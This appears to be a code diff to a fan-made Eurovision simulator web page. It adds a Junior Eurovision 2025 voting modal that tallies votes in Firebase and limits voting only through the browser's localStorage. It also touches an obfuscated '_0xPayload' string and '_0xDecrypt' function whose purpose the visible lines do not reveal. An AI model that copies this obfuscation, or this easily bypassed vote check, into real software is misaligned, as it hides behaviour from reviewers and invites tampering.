@@ -1358,6 +1358,29 @@
         </div>
     </div>
 
+    <!-- JESC Voting Modal -->
+    <div class="modal fade" id="jescVotingModal" tabindex="-1" aria-hidden="true">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header"
+                    style="background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%); color: white;">
+                    <h5 class="modal-title">👾 Junior Eurovision 2025 Voting</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"
+                        aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <div id="jescVotingContent">
+                        <p class="text-center mb-4">Vote for your favorite Junior Eurovision 2025 song! You can only
+                            vote once.</p>
+                        <div id="jescParticipantsList" class="list-group">
+                            <!-- Participants will be loaded here -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <div class="eurovision-simulator container-fluid">
         <h1 class="text-center mb-4">YOUR VERY OWN EUROVISION SIMULATOR</h1>
 
@@ -1378,6 +1401,9 @@
                         <button id="toggleChristmas" class="btn btn-danger mb-2">🎄 CHRISTMAS MODE</button>
                         <button id="adventCalendarButton" class="btn btn-success mb-2">📅 ADVENT CALENDAR</button>
                         <button id="leaderboardButton" class="btn btn-warning mb-2">🏆 LEADERBOARD</button>
+                        <button id="jescVoteButton" class="btn btn-primary mb-2"
+                            style="background: linear-gradient(45deg, #ff00cc, #3333ff); border: none;">🗳️ JESC 2025
+                            VOTE</button>
                         <button id="instructionsButton" class="btn btn-info mb-2">INSTRUCTIONS</button>
                         <button id="whatsNewButton" class="btn btn-warning mb-2">WHAT'S NEW?</button>
                         <button id="generateButton" class="btn btn-warning mb-2">GENERATE</button>
@@ -5359,7 +5385,7 @@
 
 
             const _0xPayload = [
-                "DL}dV|Gp6}]zQlif}Q9zhvEMQtvP<dD;05ORg:T", 
+                "DL}dV|Gp6}]zQlif}Q9zhvEMQtvP<dD;05ORg:T",
             ]; function _0xDecrypt(_s) {
                 let _r = "";
                 for (let i = 0; i < _s.length; i++) {
@@ -5666,6 +5692,152 @@
 
             // Make recordSimulationWin available globally for integration
             window.recordSimulationWin = recordSimulationWin;
+
+            // ===== JESC 2025 VOTING SYSTEM =====
+            const jesc2025Participants = [
+                { code: 'mt', name: 'Malta', artist: 'Eliza Borg', song: 'I Believe' },
+                { code: 'az', name: 'Azerbaijan', artist: 'Yağmur', song: 'Miau Miau' },
+                { code: 'hr', name: 'Croatia', artist: 'Marino Vrgoč', song: 'Snovi' },
+                { code: 'sm', name: 'San Marino', artist: 'Martina CRV', song: 'Beyond the Stars' },
+                { code: 'am', name: 'Armenia', artist: 'Albert', song: 'Brave Heart' },
+                { code: 'ua', name: 'Ukraine', artist: 'Sofija Nersesian', song: 'Motanka' },
+                { code: 'ie', name: 'Ireland', artist: "Lottie O'Driscoll Murray", song: 'Rúin' },
+                { code: 'nl', name: 'Netherlands', artist: 'Meadow', song: 'Freeze' },
+                { code: 'pl', name: 'Poland', artist: 'Marianna Kłos', song: 'Brightest Light' },
+                { code: 'mk', name: 'North Macedonia', artist: 'Nela Manczeska', song: 'Miracle' },
+                { code: 'me', name: 'Montenegro', artist: 'Asja Džogović', song: 'I tužna i srećna priča' },
+                { code: 'it', name: 'Italy', artist: 'Leonardo Giovannangeli', song: 'Rockstar' },
+                { code: 'pt', name: 'Portugal', artist: 'Inês Gonçalves', song: 'Para onde vai o amor?' },
+                { code: 'es', name: 'Spain', artist: 'Gonzalo Pinillos', song: 'Érase una vez' },
+                { code: 'ge', name: 'Georgia', artist: 'Anita Abgariani', song: 'Shine Like a Star' },
+                { code: 'cy', name: 'Cyprus', artist: 'Rafaella i Christos', song: 'Away' },
+                { code: 'fr', name: 'France', artist: 'Lou Deleuze', song: 'Ce monde' },
+                { code: 'al', name: 'Albania', artist: 'Kroni Pula', song: 'Fruta perime' }
+            ];
+
+            const jescVoteButton = document.getElementById('jescVoteButton');
+            const jescList = document.getElementById('jescParticipantsList');
+            let jescModal = null; // Lazy init
+
+            jescVoteButton.addEventListener('click', async () => {
+                if (!jescModal) {
+                    jescModal = new bootstrap.Modal(document.getElementById('jescVotingModal'));
+                }
+                jescModal.show();
+                await loadJescVotes(); // Load results when opening
+            });
+
+            async function loadJescVotes() {
+                jescList.innerHTML = '<div class="text-center"><div class="spinner-border text-primary" role="status"></div></div>';
+
+                let votesData = {};
+                let totalVotes = 0;
+
+                // Fetch votes from Firebase if enabled
+                if (firebaseEnabled && db) {
+                    try {
+                        const snapshot = await db.collection('jesc_2025_votes').get();
+                        snapshot.forEach(doc => {
+                            votesData[doc.id] = doc.data().votes || 0;
+                            totalVotes += doc.data().votes || 0;
+                        });
+                    } catch (error) {
+                        console.error("Error fetching JESC votes", error);
+                    }
+                }
+
+                renderJescList(votesData, totalVotes);
+            }
+
+            function renderJescList(votesData, totalVotes) {
+                const hasVoted = localStorage.getItem('hasVotedJESC2025') === 'true';
+                jescList.innerHTML = '';
+
+                // If user has voted, sort by votes descending. If not, keep standard order (by running order)
+                let sortedParticipants = [...jesc2025Participants];
+                if (hasVoted) {
+                    sortedParticipants.sort((a, b) => {
+                        const votesA = votesData[a.code] || 0;
+                        const votesB = votesData[b.code] || 0;
+                        return votesB - votesA;
+                    });
+                }
+
+                sortedParticipants.forEach((p, index) => {
+                    const votes = votesData[p.code] || 0;
+                    const percent = totalVotes > 0 ? ((votes / totalVotes) * 100).toFixed(1) : 0;
+
+                    const item = document.createElement('div');
+                    item.className = 'list-group-item d-flex justify-content-between align-items-center flex-wrap';
+
+                    let actionHtml = '';
+                    if (hasVoted) {
+                        actionHtml = `
+                            <div class="d-flex flex-column align-items-end" style="min-width: 100px;">
+                                <span class="badge bg-primary rounded-pill mb-1">${votes} votes</span>
+                                <small class="text-muted">${percent}%</small>
+                            </div>
+                         `;
+                        // Progress bar background for visual flair
+                        item.style.background = `linear-gradient(to right, rgba(230,240,255,1) ${percent}%, white ${percent}%)`;
+                    } else {
+                        actionHtml = `
+                            <button class="btn btn-outline-primary btn-sm vote-btn" data-code="${p.code}">
+                                Vote 🗳️
+                            </button>
+                        `;
+                    }
+
+                    item.innerHTML = `
+                        <div class="d-flex align-items-center">
+                            <span class="flag-icon flag-icon-${p.code} me-3" style="font-size: 1.5em; margin-right: 15px;"></span>
+                            <div>
+                                <h6 class="mb-0 fw-bold">${hasVoted ? `#${index + 1} ` : ''}${p.name}</h6>
+                                <small class="text-muted">${p.artist} - "<em>${p.song}</em>"</small>
+                            </div>
+                        </div>
+                        ${actionHtml}
+                    `;
+                    jescList.appendChild(item);
+                });
+
+                if (!hasVoted) {
+                    // Add event listeners to vote buttons
+                    document.querySelectorAll('.vote-btn').forEach(btn => {
+                        btn.addEventListener('click', (e) => castVote(e.target.dataset.code));
+                    });
+                }
+            }
+
+            async function castVote(countryCode) {
+                if (!confirm(`Are you sure you want to vote for ${jesc2025Participants.find(c => c.code === countryCode).name}? You cannot change your vote.`)) {
+                    return;
+                }
+
+                if (localStorage.getItem('hasVotedJESC2025') === 'true') {
+                    alert("You have already voted!");
+                    return;
+                }
+
+                // Optimistic update
+                localStorage.setItem('hasVotedJESC2025', 'true');
+
+                if (firebaseEnabled && db) {
+                    try {
+                        const voteRef = db.collection('jesc_2025_votes').doc(countryCode);
+                        await voteRef.set({
+                            votes: firebase.firestore.FieldValue.increment(1)
+                        }, { merge: true });
+                        console.log("Vote cast successfully!");
+                    } catch (error) {
+                        console.error("Error casting vote:", error);
+                        alert("There was an error saving your vote online, but it's recorded locally.");
+                    }
+                }
+
+                // Reload to show results
+                await loadJescVotes();
+            }
         </script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.1.3/js/bootstrap.bundle.min.js"></script>
 </body>
